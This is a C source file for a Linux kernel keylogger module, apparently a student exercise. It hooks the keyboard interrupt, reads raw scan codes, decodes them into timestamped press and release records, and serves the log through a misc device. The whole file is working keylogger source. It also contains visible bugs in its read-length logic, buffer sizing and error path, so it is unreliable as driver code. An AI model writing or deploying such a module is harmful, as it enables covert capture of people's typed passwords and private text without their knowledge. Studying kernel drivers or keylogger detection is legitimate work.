#include "keyboard.h"

static char *id = "keyboard";

static unsigned int scan_array[SIZE];

DEFINE_RWLOCK(keyboard_rwlock);

static unsigned int windex = -1;

static unsigned int rindex = 0;

static struct fsm scan_fsm = {
	.ct = 0,
	.state = UNDEFINED,
	.key = 0,
	.position = -1,
	.name = NULL,
};

LIST_HEAD(keystroke_list);

static char	*klg_buffer = NULL;

/* Multiples fd sync and protect */
/* multi buffer, multi flush ? */

int	keylogger_open(struct inode *inode, struct file *filp)
{
	struct list_head 	*pos;
	struct keystroke	*ks = NULL;
	ssize_t			size = 0;
	char			tmp[60];
	int			retval = 0;
	ssize_t			written;

	list_for_each(pos, &keystroke_list) {
		size++;
	}

	printk(KERN_INFO "nbr entries %lu\n", size);
	/* change the way it's calculed */
	/* new size + krealloc */
	if (!(klg_buffer = kmalloc(60 * size + 1, GFP_KERNEL))) {
		retval = -ENOMEM;
		goto err;
	}

	memset(tmp, 0, 60);
	memset(klg_buffer, 0, 60 * size);
	list_for_each_entry(ks, &keystroke_list, list) {
		written = sprintf(tmp, "[%04d-%02d-%02d %02d:%02d:%02d] %s %s %x\n", ks->tm.tm_year + 1900,
			ks->tm.tm_mon + 1, ks->tm.tm_mday, ks->tm.tm_hour, ks->tm.tm_min, ks->tm.tm_sec,
			ks->name, (ks->state == 0) ? "PRESSED" : "RELEASED", ks->ascii);
		strncat(klg_buffer, tmp, written);
	}

	/* init dev->size to length of klg_buffer */

err:
	return retval;
}

int	keylogger_flush(struct file *filp, fl_owner_t id)
{
	printk(KERN_INFO "flushing klg_buffer\n");
	kfree(klg_buffer);

	return 0;
}

/* offset is shared between struct file ?*/
/* seems not, cf LDD Chap3 "The file structure" */

ssize_t keylogger_read(struct file *filp, char __user *buffer,
				size_t length, loff_t *offset)
{
	ssize_t		retval = 0;
	size_t		count = 0;
	size_t		s;

	/* read semaphore or spinlock */

	/* size of buffer is dynamic */
	s = strlen(klg_buffer);
	if (*offset == s)
		goto out;

	if (*offset + length > s)
		count = s - *offset;
	if (length < s)
		count = length;
	else
		count = s;

	if ((copy_to_user(buffer, &klg_buffer[*offset], count))) {
		retval = -EFAULT;
		goto out;
	}
	*offset += count;
	return count;
	
out :
	return retval;
}

static struct file_operations keylogger_misc_fops = {
	.open = keylogger_open,
	.read = keylogger_read,
	.flush = keylogger_flush,
};

static struct miscdevice keylogger_misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "module_keylogger",
	.fops = &keylogger_misc_fops,
};

/* Assumption : if windex overrun rindex then static size is too small  */
/* To be revised */

static void do_tasklet(unsigned long unused)
{
	unsigned int packet = 0;
	unsigned int target = 0; 

	target = (windex >= rindex) ? windex : SIZE;
	while (rindex <= target)
	{
		read_lock(&keyboard_rwlock);
		packet = scan_array[rindex++];
		read_unlock(&keyboard_rwlock);
		/*printk(KERN_INFO "tasklet : [%x]\n", packet); */
		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
			target = windex;
		scan_fsm_update(&scan_fsm, packet);
		if (scan_fsm.state == SUCCESS)
			scan_fsm_send(&scan_fsm, &keystroke_list);
		if (scan_fsm.state == ERROR || scan_fsm.state == SUCCESS)
			scan_fsm_clear(&scan_fsm);
		/* state machine
		 *  if SUCCESS, format packet and& send it to buffer
		 *  if ERROR, flush fsm
		 */
		
	}
}
DECLARE_TASKLET(keyboard_tasklet, do_tasklet, 0);


/* Assumption : an interrupt handler shouldn't be intterupted by another one on same line */

irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
{
	unsigned int scan_code = 0;

	/* clearing bit for interrupts ? */
	/* get time of day */
	scan_code = inb(KEYBOARD_PORT);
	if (scan_code) {
		/* format packet */
		if (windex + 1 >= SIZE)
			windex = -1;
		write_lock(&keyboard_rwlock);
		scan_array[++windex] = scan_code;
		write_unlock(&keyboard_rwlock);
		tasklet_schedule(&keyboard_tasklet);
	}
	return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
	int		result;

	result = misc_register(&keylogger_misc);
	if (result) {
		printk(KERN_INFO "misc keylogger : register failed with %d\n", result);
		goto err;
	}
	else {
		printk(KERN_INFO "misc keylogger : register successful\n");
	}

	result = request_irq(KEYBOARD_IRQ, keyboard_interrupt, IRQF_SHARED, "keyboard-driver", id);
	if (result) {
		printk(KERN_INFO "driver keylogger : IRQ register failed");
		
		goto err;
	}
	
	return result;

err:
	misc_deregister(&keylogger_misc);
	free_irq(KEYBOARD_IRQ, id);
	return result;
}

static void __exit keylogger_cleanup(void)
{
	struct keystroke	*ks = NULL;
	struct keystroke 	*n = NULL;
	ssize_t			size = 0;	

	misc_deregister(&keylogger_misc);
/*	void driver_register(struct device_driver *drv) */

	free_irq(KEYBOARD_IRQ, id);

	/* free list */
	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
		list_del(&ks->list);	
		kfree(ks);
		size++;
	}

	/* free misc buffer */
	printk(KERN_INFO "nbr of entries was %lu\n", size);
	printk(KERN_INFO "keylogger module : deregister\n");
}

module_init(keylogger_init);
module_exit(keylogger_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Antoine Riard <ariard@student.42.fr>");
MODULE_DESCRIPTION("keylogger module");
